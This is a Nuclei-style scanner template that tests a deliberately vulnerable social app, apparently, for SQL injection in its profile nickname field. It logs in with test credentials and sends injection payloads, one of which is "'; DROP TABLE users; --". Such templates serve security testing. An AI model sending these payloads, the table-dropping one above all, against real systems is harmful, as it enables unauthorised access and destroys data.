id: vuln-sns-profile-update-sql-injection
info:
  name: Vuln SNS Profile Update - SQL Injection
  author: claude
  severity: critical
  description: |
    Tests for SQL injection in profile update nickname parameter.
  reference:
    - https://owasp.org/www-community/attacks/SQL_Injection
  tags: vuln-sns,sqli,profile-update

http:
  - raw:
      - |
        POST /api/login HTTP/1.1
        Host: {{Hostname}}
        Content-Type: application/json
        
        {"user_id":"alice","password":"alice"}
        
      - |
        PUT /api/profile HTTP/1.1
        Host: {{Hostname}}
        Content-Type: application/json
        Authorization: Bearer {{token}}
        
        {"nickname":"{{payload}}"}

    payloads:
      payload:
        - "Test' OR '1'='1"
        - "Test' OR '1'='1' --"
        - "Test'; DROP TABLE users; --"

    extractors:
      - type: regex
        name: token
        regex:
          - '"token":\s*"([^"]+)"'
        part: body_1
        internal: true

    matchers:
      - type: word
        words:
          - "SQL syntax"
          - "mysql error"
        condition: or
        part: body_2